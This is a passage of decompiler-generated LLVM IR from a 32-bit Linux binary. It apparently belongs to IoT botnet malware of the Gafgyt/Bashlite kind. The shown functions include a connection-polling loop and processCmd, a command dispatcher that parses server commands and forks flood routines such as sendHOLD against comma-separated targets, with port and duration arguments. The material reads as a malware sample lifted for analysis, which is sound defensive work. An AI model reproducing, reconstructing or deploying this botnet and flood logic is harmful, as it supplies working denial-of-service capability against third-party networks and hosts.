  store i32 %v2_804c3a0, i32* %v3_804c3a6, align 4
  store i32 %v2_804c3a7, i32* %eax.global-to-local, align 4
  %v2_804c3ad = add i32 %v0_804c37e, 12
  %v3_804c3ad = inttoptr i32 %v2_804c3ad to i32*
  store i32 %v2_804c3a7, i32* %v3_804c3ad, align 4
  %v1_804c3ae = add i32 %v0_804c37e, 8
  %v2_804c3ae = inttoptr i32 %v1_804c3ae to i32*
  store i32 4, i32* %v2_804c3ae, align 4
  %v1_804c3b0 = add i32 %v0_804c37e, 4
  %v2_804c3b0 = inttoptr i32 %v1_804c3b0 to i32*
  store i32 1, i32* %v2_804c3b0, align 4
  %v0_804c3b2 = load i32, i32* %edx.global-to-local, align 4
  %v3_804c3b2 = inttoptr i32 %v0_804c37e to i32*
  store i32 %v0_804c3b2, i32* %v3_804c3b2, align 4
  %v0_804c3b3 = load i32, i32* %stack_var_-208, align 4
  %v1_804c3b3 = load i32, i32* %stack_var_-204, align 4
  %v3_804c3b3 = load i32, i32* %stack_var_-196, align 4
  %v5_804c3b3 = call i32 @getsockopt(i32 %v0_804c3b3, i32 %v1_804c3b3, i32 10000, i32 %v3_804c3b3, i32 ptrtoint (i32* @0 to i32))
  %v0_804c3b8 = load i32, i32* @esp, align 4
  %v3_804c3bb = load i32, i32* %stack_var_-212, align 4
  %v1_804c3c1 = icmp eq i32 %v3_804c3bb, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  br i1 %v1_804c3c1, label %dec_label_pc_804c3ea, label %dec_label_pc_804c3c5

dec_label_pc_804c3c5:                             ; preds = %dec_label_pc_804c38a
  %v5_804c3cb = load i32, i32* %v4_804c327, align 8
  store i32 %v5_804c3cb, i32* %eax.global-to-local, align 4
  %v2_804c3d1 = add i32 %v0_804c3b8, 16
  %v3_804c3d1 = inttoptr i32 %v2_804c3d1 to i32*
  store i32 %v5_804c3cb, i32* %v3_804c3d1, align 4
  %v0_804c3d2 = load i32, i32* %stack_var_-208, align 4
  %v1_804c3d2 = call i32 @__libc_close(i32 %v0_804c3d2)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c227, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c3ea:                             ; preds = %dec_label_pc_804c38a
  store i8 2, i8* %v5_804c227, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c3fa:                             ; preds = %dec_label_pc_804c308
  %v13_804c3fa = icmp eq i32 %v5_804c379, -1
  %v1_804c3fe = icmp eq i1 %v13_804c3fa, false
  br i1 %v1_804c3fe, label %dec_label_pc_804c4cb, label %dec_label_pc_804c404

dec_label_pc_804c404:                             ; preds = %dec_label_pc_804c3fa
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c40a = load i32, i32* %v4_804c327, align 8
  store i32 %v5_804c40a, i32* %eax.global-to-local, align 4
  %v2_804c410 = add i32 %v0_804c37e, 16
  %v3_804c410 = inttoptr i32 %v2_804c410 to i32*
  store i32 %v5_804c40a, i32* %v3_804c410, align 4
  %v1_804c411 = call i32 @__libc_close(i32 %v5_804c379)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c227, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c429:                             ; preds = %dec_label_pc_804c245
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c312, i32* @edi, align 4
  %v5_804c43a = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v3_804c448 = add i32 %v2_804c227, %v2_804c1a5
  %v4_804c448 = inttoptr i32 %v3_804c448 to i32*
  %v5_804c448 = load i32, i32* %v4_804c448, align 8
  %v2_804c44d = udiv i32 %v5_804c448, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c456 = load i32, i32* %v4_804c448, align 8
  %v1_804c459 = urem i32 %v5_804c456, 32
  store i32 %v1_804c459, i32* %eax.global-to-local, align 4
  %v0_804c45c = load i32, i32* @ebp, align 4
  %v2_804c45c = mul nuw nsw i32 %v2_804c44d, 4
  %v3_804c45c = add nsw i32 %v2_804c45c, -192
  %v4_804c45c = add i32 %v3_804c45c, %v0_804c45c
  %v5_804c45c = inttoptr i32 %v4_804c45c to i32*
  %v6_804c45c = load i32, i32* %v5_804c45c, align 4
  %v9_804c45c = shl i32 1, %v1_804c459
  %v12_804c45c = or i32 %v6_804c45c, %v9_804c45c
  store i32 %v12_804c45c, i32* %v5_804c45c, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c47e = load i32, i32* %v4_804c448, align 8
  %v1_804c481 = add i32 %v5_804c47e, 1
  store i32 %v1_804c481, i32* %edx.global-to-local, align 4
  %v0_804c484 = load i32, i32* @esp, align 4
  %v2_804c48d = add i32 %v0_804c484, -16
  %v3_804c48d = inttoptr i32 %v2_804c48d to i32*
  store i32 %v2_804c366, i32* %v3_804c48d, align 4
  store i32 %v2_804c312, i32* %eax.global-to-local, align 4
  %v2_804c494 = add i32 %v0_804c484, -20
  %v3_804c494 = inttoptr i32 %v2_804c494 to i32*
  store i32 %v2_804c312, i32* %v3_804c494, align 4
  %v1_804c495 = add i32 %v0_804c484, -24
  %v2_804c495 = inttoptr i32 %v1_804c495 to i32*
  store i32 0, i32* %v2_804c495, align 4
  %v1_804c497 = add i32 %v0_804c484, -28
  %v2_804c497 = inttoptr i32 %v1_804c497 to i32*
  store i32 0, i32* %v2_804c497, align 4
  %v0_804c499 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c499 = add i32 %v0_804c484, -32
  %v3_804c499 = inttoptr i32 %v2_804c499 to i32*
  store i32 %v0_804c499, i32* %v3_804c499, align 4
  %v0_804c49a = load i32, i32* %stack_var_-204, align 4
  %v2_804c49a = load i32, i32* %stack_var_-196, align 4
  %v5_804c49a = call i32 @__libc_select(i32 %v0_804c49a, i32 10000, i32 %v2_804c49a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c49a, i32* %eax.global-to-local, align 4
  %v4_804c4a5 = icmp eq i32 %v5_804c49a, 0
  br i1 %v4_804c4a5, label %dec_label_pc_804c4cb, label %dec_label_pc_804c4ab

dec_label_pc_804c4ab:                             ; preds = %dec_label_pc_804c429
  %v0_804c49f = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c4b1 = load i32, i32* %v4_804c448, align 8
  store i32 %v5_804c4b1, i32* %eax.global-to-local, align 4
  %v2_804c4b7 = add i32 %v0_804c49f, 16
  %v3_804c4b7 = inttoptr i32 %v2_804c4b7 to i32*
  store i32 %v5_804c4b1, i32* %v3_804c4b7, align 4
  %v1_804c4b8 = call i32 @__libc_close(i32 %v5_804c49a)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c227, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c252, %dec_label_pc_804c429, %dec_label_pc_804c3fa, %dec_label_pc_804c404, %dec_label_pc_804c3ea, %dec_label_pc_804c3c5, %dec_label_pc_804c2f8, %dec_label_pc_804c2de, %dec_label_pc_804c4ab
  %v4_804c4cb = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804c4cb, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c4cb, %v2_804c12e
  br i1 %exitcond, label %dec_label_pc_804c4ce.dec_label_pc_804c4da.loopexit_crit_edge, label %dec_label_pc_804c221

dec_label_pc_804c4ce.dec_label_pc_804c4da.loopexit_crit_edge: ; preds = %dec_label_pc_804c4cb
  %v0_804c4da.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c4da

dec_label_pc_804c4da:                             ; preds = %dec_label_pc_804c4ce.preheader, %dec_label_pc_804c4ce.dec_label_pc_804c4da.loopexit_crit_edge, %dec_label_pc_804c16f
  %v0_804c4da = phi i32 [ %v1_804c207, %dec_label_pc_804c16f ], [ %v0_804c4da.pre.pre, %dec_label_pc_804c4ce.dec_label_pc_804c4da.loopexit_crit_edge ], [ %v1_804c4e4, %dec_label_pc_804c4ce.preheader ]
  %stack_var_-44.0 = phi i32 [ %tmp10, %dec_label_pc_804c16f ], [ %v2_804c12e, %dec_label_pc_804c4ce.dec_label_pc_804c4da.loopexit_crit_edge ], [ 0, %dec_label_pc_804c4ce.preheader ]
  %v1_804c4dd = add i32 %v0_804c4da, -16
  %v2_804c4dd = inttoptr i32 %v1_804c4dd to i32*
  store i32 0, i32* %v2_804c4dd, align 4
  %v1_804c4df = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804c4df = call i32 @__GI_time(i32* %v1_804c4df)
  store i32 %v2_804c4df, i32* %eax.global-to-local, align 4
  %v5_804c4ea = icmp slt i32 %v2_804c4df, %v5_804c20a
  br i1 %v5_804c4ea, label %dec_label_pc_804c4ce.preheader, label %dec_label_pc_804c4f0

dec_label_pc_804c4ce.preheader:                   ; preds = %dec_label_pc_804c4da
  %v0_804c4e4 = load i32, i32* @esp, align 4
  %v1_804c4e4 = add i32 %v0_804c4e4, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804c4d440, label %dec_label_pc_804c221, label %dec_label_pc_804c4da

dec_label_pc_804c4f0:                             ; preds = %dec_label_pc_804c4da, %entry
  %v0_804c4fc = phi i32 [ %v3_804c15e, %entry ], [ %v2_804c4df, %dec_label_pc_804c4da ]
  %v2_804c4f9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c4f9, i32* @ebx, align 4
  store i32 %v0_804c110, i32* @edi, align 4
  ret i32 %v0_804c4fc

; uselistorder directives
  uselistorder i32 %v4_804c4cb, { 1, 2, 0 }
  uselistorder i32 %v1_804c459, { 1, 0 }
  uselistorder i32 %v0_804c37e, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804c379, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c338, { 1, 0 }
  uselistorder i32* %v4_804c327, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804c292, { 2, 0, 1 }
  uselistorder i32 %v7_804c227, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i8* %v5_804c227, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge41, { 0, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 21, 20, 19, 18, 17, 16, 22, 1, 2 }
  uselistorder i32 %v2_804c312, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804c1c2, { 1, 0 }
  uselistorder i32 %v2_804c1a5, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804c13c, { 1, 0 }
  uselistorder i32 %v2_804c12e, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804c120, { 1, 0, 2 }
  uselistorder i32 %v12_804c112, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 2, 1, 3, 0, 4 }
  uselistorder i32* %stack_var_-204, { 1, 3, 0, 2, 4, 5 }
  uselistorder i32* %stack_var_-208, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 45, 44, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 6, 5, 4, 7, 3, 2, 1, 0 }
  uselistorder i32 10000, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 11, 12, 13, 9, 10 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c4cb, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp109 = call i32 @__decompiler_undefined_function_0()
  %tmp119 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c500 = load i32, i32* @edi, align 4
  %v0_804c501 = load i32, i32* @esi, align 4
  %v0_804c502 = load i32, i32* @ebx, align 4
  store i32 %v0_804c502, i32* %stack_var_-16, align 4
  %v5_804c503 = icmp ult i32* %stack_var_-16, inttoptr (i32 252 to i32*)
  store i1 %v5_804c503, i1* %cf.global-to-local, align 1
  %v1_804c50c = inttoptr i32 %tmp119 to i32*
  %v2_804c50c = load i32, i32* %v1_804c50c, align 4
  %v4_804c529 = inttoptr i32 %v2_804c50c to i8*
  store i32 %v2_804c50c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052977.27 to i32), i32* @edi, align 4
  %v7_804c53b = call i32 @_strncmp(i8* %v4_804c529, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052977.27, i32 0, i32 0), i32 5)
  %v8_804c53b = urem i32 %v7_804c53b, 2
  %v9_804c53b = icmp eq i32 %v8_804c53b, 0
  %v0_804c53d = load i1, i1* %cf.global-to-local, align 1
  %v2_804c53d = or i1 %v0_804c53d, %v9_804c53b
  %v3_804c53d = zext i1 %v2_804c53d to i32
  %v4_804c53d = load i32, i32* @edx, align 4
  %v5_804c53d = and i32 %v4_804c53d, -256
  %v6_804c53d = or i32 %v3_804c53d, %v5_804c53d
  %v7_804c53d = xor i32 %v6_804c53d, 1
  store i32 %v7_804c53d, i32* %edx.global-to-local, align 4
  %v1_804c545 = trunc i32 %v7_804c53d to i8
  %v3_804c545 = zext i1 %v0_804c53d to i8
  %v15_804c545 = icmp eq i8 %v1_804c545, %v3_804c545
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c54e = icmp eq i1 %v15_804c545, false
  br i1 %v1_804c54e, label %dec_label_pc_804c56b, label %dec_label_pc_804c550

dec_label_pc_804c550:                             ; preds = %entry
  %v0_804c550 = load i32, i32* @global_var_8055420.26, align 32
  %v0_804c555 = load i32, i32* @esp, align 4
  %v5_804c555 = icmp ult i32 %v0_804c555, 8
  store i1 %v5_804c555, i1* %cf.global-to-local, align 1
  %v2_804c55e = call i32 @sockprintf(i32 %v0_804c550, i32 ptrtoint ([6 x i8]* @global_var_80529fc.54 to i32))
  %v0_804c563 = load i32, i32* @esp, align 4
  %v2_804c563 = icmp ugt i32 %v0_804c563, -17
  store i1 %v2_804c563, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf8b

dec_label_pc_804c56b:                             ; preds = %entry
  %v2_804c56e = load i32, i32* %v1_804c50c, align 4
  %v4_804c58b = inttoptr i32 %v2_804c56e to i8*
  store i32 %v2_804c56e, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8052a02.55 to i32), i32* @edi, align 4
  %v7_804c59d = call i32 @_strncmp(i8* %v4_804c58b, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8052a02.55, i32 0, i32 0), i32 11)
  %v8_804c59d = urem i32 %v7_804c59d, 2
  %v9_804c59d = icmp eq i32 %v8_804c59d, 0
  %v0_804c59f = load i1, i1* %cf.global-to-local, align 1
  %v2_804c59f = or i1 %v0_804c59f, %v9_804c59d
  %v3_804c59f = zext i1 %v2_804c59f to i32
  %v4_804c59f = load i32, i32* %edx.global-to-local, align 4
  %v5_804c59f = and i32 %v4_804c59f, -256
  %v6_804c59f = or i32 %v3_804c59f, %v5_804c59f
  %v7_804c59f = xor i32 %v6_804c59f, 1
  store i32 %v7_804c59f, i32* %edx.global-to-local, align 4
  %v1_804c5a7 = trunc i32 %v7_804c59f to i8
  %v3_804c5a7 = zext i1 %v0_804c59f to i8
  %v15_804c5a7 = icmp eq i8 %v1_804c5a7, %v3_804c5a7
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5b0 = icmp eq i1 %v15_804c5a7, false
  br i1 %v1_804c5b0, label %dec_label_pc_804c5e0, label %dec_label_pc_804c5b2

dec_label_pc_804c5b2:                             ; preds = %dec_label_pc_804c56b
  %v0_804c5b2 = load i32, i32* @esp, align 4
  %v5_804c5b2 = icmp ult i32 %v0_804c5b2, 12
  store i1 %v5_804c5b2, i1* %cf.global-to-local, align 1
  %v0_804c5b5 = load i32, i32* @global_var_805b4a0.33, align 32
  %v1_804c5bb = call i32 @__GI_inet_ntoa(i32 %v0_804c5b5)
  %v0_804c5c3 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804c5c3, i32* %edx.global-to-local, align 4
  %v5_804c5c9 = icmp ult i32* %stack_var_-268, inttoptr (i32 4 to i32*)
  store i1 %v5_804c5c9, i1* %cf.global-to-local, align 1
  %v2_804c5d3 = call i32 @sockprintf(i32 %v0_804c5c3, i32 ptrtoint ([10 x i8]* @global_var_8052a0d.56 to i32))
  %v0_804c5d8 = load i32, i32* @esp, align 4
  %v2_804c5d8 = icmp ugt i32 %v0_804c5d8, -17
  store i1 %v2_804c5d8, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf8b

dec_label_pc_804c5e0:                             ; preds = %dec_label_pc_804c56b
  %v2_804c5e3 = load i32, i32* %v1_804c50c, align 4
  %v4_804c600 = inttoptr i32 %v2_804c5e3 to i8*
  store i32 %v2_804c5e3, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052a17.57 to i32), i32* @edi, align 4
  %v7_804c612 = call i32 @_strncmp(i8* %v4_804c600, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052a17.57, i32 0, i32 0), i32 5)
  %v8_804c612 = urem i32 %v7_804c612, 2
  %v9_804c612 = icmp eq i32 %v8_804c612, 0
  %v0_804c614 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c614 = or i1 %v0_804c614, %v9_804c612
  %v3_804c614 = zext i1 %v2_804c614 to i32
  %v4_804c614 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c614 = and i32 %v4_804c614, -256
  %v6_804c614 = or i32 %v3_804c614, %v5_804c614
  %v7_804c614 = xor i32 %v6_804c614, 1
  store i32 %v7_804c614, i32* @edx, align 4
  %v1_804c61c = trunc i32 %v7_804c614 to i8
  %v3_804c61c = zext i1 %v0_804c614 to i8
  %v4_804c61c = sub nsw i8 %v1_804c61c, %v3_804c61c
  %v15_804c61c = icmp eq i8 %v4_804c61c, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c625 = icmp eq i1 %v15_804c61c, false
  br i1 %v1_804c625, label %dec_label_pc_804c766, label %dec_label_pc_804c62b

dec_label_pc_804c62b:                             ; preds = %dec_label_pc_804c5e0
  %v2_804c620 = sext i8 %v4_804c61c to i32
  %v9_804c62b = icmp ult i32 %tmp109, 3
  store i1 %v9_804c62b, i1* %cf.global-to-local, align 1
  %v7_804c62f = icmp sgt i32 %tmp109, 3
  br i1 %v7_804c62f, label %dec_label_pc_804c635, label %dec_label_pc_804cf8b

dec_label_pc_804c635:                             ; preds = %dec_label_pc_804c62b
  %v1_804c638 = add i32 %tmp119, 8
  %v1_804c63b = inttoptr i32 %v1_804c638 to i32*
  %v2_804c63b = load i32, i32* %v1_804c63b, align 4
  %v0_804c63d = load i32, i32* @esp, align 4
  %v5_804c63d = icmp ult i32 %v0_804c63d, 12
  store i1 %v5_804c63d, i1* %cf.global-to-local, align 1
  %v1_804c641 = call i32 @atol(i32 %v2_804c63b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v1_804c641, 1
  br i1 %tmp134, label %dec_label_pc_804cf8b, label %dec_label_pc_804c651

dec_label_pc_804c651:                             ; preds = %dec_label_pc_804c635
  %v1_804c654 = add i32 %tmp119, 12
  %v1_804c657 = inttoptr i32 %v1_804c654 to i32*
  %v2_804c657 = load i32, i32* %v1_804c657, align 4
  %v5_804c659 = icmp ult i32* %stack_var_-268, inttoptr (i32 12 to i32*)
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c65d = call i32 @atol(i32 %v2_804c657)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp135 = icmp slt i32 %v1_804c65d, 1
  %tmp136 = icmp eq i1 %tmp135, false
  br i1 %tmp136, label %dec_label_pc_804c66e, label %dec_label_pc_804cf8b

dec_label_pc_804c66e:                             ; preds = %dec_label_pc_804c651
  %v1_804c671 = add i32 %tmp119, 4
  %v1_804c674 = inttoptr i32 %v1_804c671 to i32*
  %v2_804c674 = load i32, i32* %v1_804c674, align 4
  %v2_804c67f = load i32, i32* %v1_804c63b, align 4
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c685 = call i32 @atol(i32 %v2_804c67f)
  %v2_804c696 = load i32, i32* %v1_804c657, align 4
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c69c = call i32 @atol(i32 %v2_804c696)
  %v5_804c6aa = icmp ult i32* %stack_var_-268, inttoptr (i32 8 to i32*)
  store i1 %v5_804c6aa, i1* %cf.global-to-local, align 1
  %v2_804c6b0 = inttoptr i32 %v2_804c674 to i8*
  %v3_804c6b0 = call i32 @__GI_strchr(i8* %v2_804c6b0, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c6b8 = icmp eq i32 %v3_804c6b0, 0
  br i1 %v1_804c6b8, label %dec_label_pc_804c72a, label %dec_label_pc_804c6bc

dec_label_pc_804c6bc:                             ; preds = %dec_label_pc_804c66e
  store i32 %v2_804c674, i32* @eax, align 4
  store i1 %v5_804c6aa, i1* %cf.global-to-local, align 1
  %v2_804c6c8 = call i32 @__GI_strtok(i32 %v2_804c674, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c722163 = icmp eq i32 %v2_804c6c8, 0
  %v1_804c726164 = icmp eq i1 %v4_804c722163, false
  br i1 %v1_804c726164, label %dec_label_pc_804c6d5, label %dec_label_pc_804c766

dec_label_pc_804c6d5:                             ; preds = %dec_label_pc_804c6bc, %dec_label_pc_804c70d
  %storemerge60165 = phi i32 [ %v2_804c717, %dec_label_pc_804c70d ], [ %v2_804c6c8, %dec_label_pc_804c6bc ]
  %v0_804c6d5 = call i32 @listFork()
  store i32 %v0_804c6d5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c6da = icmp eq i32 %v0_804c6d5, 0
  %v1_804c6dc = icmp eq i1 %v1_804c6da, false
  %v0_804c70d = load i32, i32* @esp, align 4
  br i1 %v1_804c6dc, label %dec_label_pc_804c70d, label %dec_label_pc_804c6de

dec_label_pc_804c6de:                             ; preds = %dec_label_pc_804c6d5
  %v5_804c6de = icmp ult i32 %v0_804c70d, 4
  store i1 %v5_804c6de, i1* %cf.global-to-local, align 1
  %v3_804c6ea = call i32 @sendHOLD(i32 %storemerge60165, i32 %v1_804c685, i32 %v1_804c69c)
  %v0_804c6f2 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c6fb = call i32 @__libc_close(i32 %v0_804c6f2)
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c708 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c70d:                             ; preds = %dec_label_pc_804c6d5
  %v5_804c70d = icmp ult i32 %v0_804c70d, 8
  store i1 %v5_804c70d, i1* %cf.global-to-local, align 1
  %v2_804c717 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c722 = icmp eq i32 %v2_804c717, 0
  %v1_804c726 = icmp eq i1 %v4_804c722, false
  br i1 %v1_804c726, label %dec_label_pc_804c6d5, label %dec_label_pc_804c766

dec_label_pc_804c72a:                             ; preds = %dec_label_pc_804c66e
  %v0_804c72a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c72f = icmp eq i32 %v0_804c72a, 0
  %v1_804c731 = icmp eq i1 %v1_804c72f, false
  br i1 %v1_804c731, label %dec_label_pc_804cf8b, label %dec_label_pc_804c737

dec_label_pc_804c737:                             ; preds = %dec_label_pc_804c72a
  %v0_804c737 = load i32, i32* @esp, align 4
  %v5_804c737 = icmp ult i32 %v0_804c737, 4
  store i1 %v5_804c737, i1* %cf.global-to-local, align 1
  %v3_804c743 = call i32 @sendHOLD(i32 %v2_804c674, i32 %v1_804c685, i32 %v1_804c69c)
  %v0_804c74b = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c754 = call i32 @__libc_close(i32 %v0_804c74b)
  store i1 %v5_804c659, i1* %cf.global-to-local, align 1
  %v1_804c761 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c766:                             ; preds = %dec_label_pc_804c6bc, %dec_label_pc_804c70d, %dec_label_pc_804c5e0
  %v2_804c769 = load i32, i32* %v1_804c50c, align 4
  %v4_804c786 = inttoptr i32 %v2_804c769 to i8*
  store i32 %v2_804c769, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052a1c.58 to i32), i32* @edi, align 4
  %v7_804c798 = call i32 @_strncmp(i8* %v4_804c786, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052a1c.58, i32 0, i32 0), i32 5)
  %v8_804c798 = urem i32 %v7_804c798, 2
  %v9_804c798 = icmp eq i32 %v8_804c798, 0
  %v0_804c79a = load i1, i1* %cf.global-to-local, align 1
  %v2_804c79a = or i1 %v0_804c79a, %v9_804c798
  %v3_804c79a = zext i1 %v2_804c79a to i32
  %v4_804c79a = load i32, i32* @edx, align 4
  %v5_804c79a = and i32 %v4_804c79a, -256
  %v6_804c79a = or i32 %v3_804c79a, %v5_804c79a
  %v7_804c79a = xor i32 %v6_804c79a, 1
  store i32 %v7_804c79a, i32* @edx, align 4
  %v1_804c7a2 = trunc i32 %v7_804c79a to i8
  %v3_804c7a2 = zext i1 %v0_804c79a to i8
  %v4_804c7a2 = sub nsw i8 %v1_804c7a2, %v3_804c7a2
  %v15_804c7a2 = icmp eq i8 %v4_804c7a2, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7ab = icmp eq i1 %v15_804c7a2, false
  br i1 %v1_804c7ab, label %dec_label_pc_804c8ec, label %dec_label_pc_804c7b1

dec_label_pc_804c7b1:                             ; preds = %dec_label_pc_804c766
  %v2_804c7a6 = sext i8 %v4_804c7a2 to i32
  %v9_804c7b1 = icmp ult i32 %tmp109, 3
  store i1 %v9_804c7b1, i1* %cf.global-to-local, align 1
  %v7_804c7b5 = icmp sgt i32 %tmp109, 3
  br i1 %v7_804c7b5, label %dec_label_pc_804c7bb, label %dec_label_pc_804cf8b

dec_label_pc_804c7bb:                             ; preds = %dec_label_pc_804c7b1
  %v1_804c7be = add i32 %tmp119, 8
  %v1_804c7c1 = inttoptr i32 %v1_804c7be to i32*
  %v2_804c7c1 = load i32, i32* %v1_804c7c1, align 4
  %v0_804c7c3 = load i32, i32* @esp, align 4
  %v5_804c7c3 = icmp ult i32 %v0_804c7c3, 12
  store i1 %v5_804c7c3, i1* %cf.global-to-local, align 1
  %v1_804c7c7 = call i32 @atol(i32 %v2_804c7c1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp137 = icmp slt i32 %v1_804c7c7, 1
  br i1 %tmp137, label %dec_label_pc_804cf8b, label %dec_label_pc_804c7d7

dec_label_pc_804c7d7:                             ; preds = %dec_label_pc_804c7bb
  %v1_804c7da = add i32 %tmp119, 12
  %v1_804c7dd = inttoptr i32 %v1_804c7da to i32*
  %v2_804c7dd = load i32, i32* %v1_804c7dd, align 4
  %v5_804c7df = icmp ult i32* %stack_var_-268, inttoptr (i32 12 to i32*)
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c7e3 = call i32 @atol(i32 %v2_804c7dd)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v1_804c7e3, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_804c7f4, label %dec_label_pc_804cf8b

dec_label_pc_804c7f4:                             ; preds = %dec_label_pc_804c7d7
  %v1_804c7f7 = add i32 %tmp119, 4
  %v1_804c7fa = inttoptr i32 %v1_804c7f7 to i32*
  %v2_804c7fa = load i32, i32* %v1_804c7fa, align 4
  %v2_804c805 = load i32, i32* %v1_804c7c1, align 4
